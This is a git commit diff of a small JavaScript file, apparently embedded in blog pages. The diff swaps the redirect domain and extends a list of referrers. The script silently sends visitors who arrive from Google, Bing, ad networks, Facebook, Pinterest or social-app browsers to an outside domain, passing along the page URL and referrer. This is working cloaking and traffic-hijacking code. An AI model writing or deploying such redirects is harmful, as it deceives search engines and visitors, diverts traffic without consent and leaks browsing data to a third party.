43bf103305a95ea8e1b2dc0044c188f928a144a5
sandiutama9 <117800065+sandiutama9@users.noreply.github.com>
2022-12-29 03:44:45 +0800

    Update arsaeytmp3.js

--- arsaeytmp3.js
+++ arsaeytmp3.js
@@ -1,5 +1,6 @@
   //<![CDATA[
-var ars = 'https://www.ytmp3.club';
+var ars = 'https://www.yama.my.id';
 
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'blogspot.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+if(['.google.', 'bing.', 'yandex.', '.doubleclick.', '.googleadservices.', '.ampproject.', 'facebook.', 'pinterest.', 'blogspot.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
 //]]>
+</script>
